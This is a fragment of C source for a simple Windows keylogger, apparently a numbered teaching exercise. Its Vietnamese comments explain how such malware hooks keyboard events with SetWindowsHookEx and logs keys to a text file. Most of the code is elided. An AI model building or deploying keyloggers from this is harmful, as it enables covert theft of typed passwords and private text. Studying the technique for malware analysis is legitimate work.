...
/*
** Mô tả:
** - Malware dạng này sử dụng Windows Hooking (SetWindowsHookEx) để đăng ký hook.
**		Có 2 loại event bàn phím: WH_KEYBOARD và WH_KEYBOARD_LL (loại này không cần triển khai thủ tục hook
**		ở một DLL độc lập). Khi người dùng nhấn phím, thủ tục hook được gọi. Malware tiến hành log lại phím.
** - SetWindowsHookEx sẽ nhận vào loại event, con trỏ hàm của thủ tục hook (và 2 tham số khác nữa)
** - Thông thường thủ tục hook đc cài đặt ở một DLL độc lập
...
int main()
{
	...
	wsprintfA(filePath, TEXT("%s\\Ex17_Simple_Keylogger2.txt"), filePath);
	...
	if (!KeyboardHook) {
		...
		printf(" [!] Failed to get handle from SetWindowsHookEx().\n");
	}
	else {
